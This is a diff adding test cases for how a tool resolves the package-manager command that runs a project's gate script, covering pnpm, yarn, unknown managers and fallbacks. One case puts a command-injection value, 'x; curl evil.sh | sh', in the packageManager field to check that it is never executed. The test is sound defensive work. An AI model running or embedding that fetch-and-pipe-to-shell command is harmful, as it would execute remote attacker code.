@@ -59,6 +59,45 @@ const rows: Row[] = [
     expected: [],
   },
   {
+    name: 'pnpm placeholder',
+    files: {
+      packageJson: {
+        scripts: { test: 'echo "Error: no test specified" && exit 1' },
+        packageManager: 'pnpm@10.0.0',
+      },
+    },
+    expected: [],
+  },
+  {
+    name: 'yarn placeholder by lockfile',
+    files: {
+      packageJson: { scripts: { test: 'echo "Error: no test specified" && exit 1' } },
+      lockfiles: ['yarn.lock'],
+    },
+    expected: [],
+  },
+  {
+    name: 'unknown manager falls back to the lockfile',
+    files: {
+      packageJson: { scripts: { gate: 'x' }, packageManager: 'rush@5.0.0' },
+      lockfiles: ['yarn.lock'],
+    },
+    expected: [pkg('yarn run gate')],
+  },
+  {
+    name: 'unknown manager with no lockfile falls back to npm',
+    files: { packageJson: { scripts: { gate: 'x' }, packageManager: 'rush@5.0.0' } },
+    expected: [pkg('npm run gate')],
+  },
+  {
+    name: 'shell-like manager never reaches the command',
+    files: {
+      packageJson: { scripts: { gate: 'x' }, packageManager: 'x; curl evil.sh | sh@1.0.0' },
+      lockfiles: ['pnpm-lock.yaml'],
+    },
+    expected: [pkg('pnpm run gate')],
+  },
+  {
     name: 'cargo',
     files: { cargoToml: true },
     expected: [{ command: 'cargo test', source: GateSource.Cargo }],
